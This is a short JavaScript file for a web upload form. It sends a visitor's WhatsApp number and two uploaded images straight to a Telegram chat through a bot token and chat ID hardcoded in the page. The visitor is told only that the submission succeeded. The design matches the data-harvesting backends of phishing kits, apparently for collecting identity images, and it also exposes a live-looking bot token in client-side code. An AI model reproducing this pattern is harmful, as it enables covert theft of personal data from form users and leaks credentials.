document.getElementById("uploadForm").addEventListener("submit", async function (e) {
    e.preventDefault();

    const botToken = "7607642073:AAGeyNCG4fuahJLGzqS-Zv2-oXbH_YpA6vQ";  // Replace with your bot token
    const chatId = "7101300226";      // Replace with your Telegram chat ID

    let phone = document.getElementById("phone").value;
    let file1 = document.getElementById("file1").files[0];
    let file2 = document.getElementById("file2").files[0];
    let submitBtn = document.getElementById("submitBtn");
    let loading = document.getElementById("loading");

    if (!file1 || !file2) {
        alert("Please select two images.");
        return;
    }

    // Show loading animation
    submitBtn.style.display = "none";
    loading.classList.remove("hidden");

    // Send WhatsApp number to Telegram
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=New Submission\nWhatsApp: ${phone}`);

    // Function to send file to Telegram
    async function sendFile(file) {
        let formData = new FormData();
        formData.append("chat_id", chatId);
        formData.append("document", file);

        return fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
            method: "POST",
            body: formData
        });
    }

    // Send both files
    await sendFile(file1);
    await sendFile(file2);

    alert("Submission successful!");

    // Hide loading and show submit button again
    loading.classList.add("hidden");
    submitBtn.style.display = "block";
});

// Change file label to 'Done' when a file is selected
document.getElementById("file1").addEventListener("change", function() {
    document.getElementById("file1Label").textContent = "✅ Done!";
    document.getElementById("file1Label").classList.add("done");
});

document.getElementById("file2").addEventListener("change", function() {
    document.getElementById("file2Label").textContent = "✅ Done!";
    document.getElementById("file2Label").classList.add("done");
});
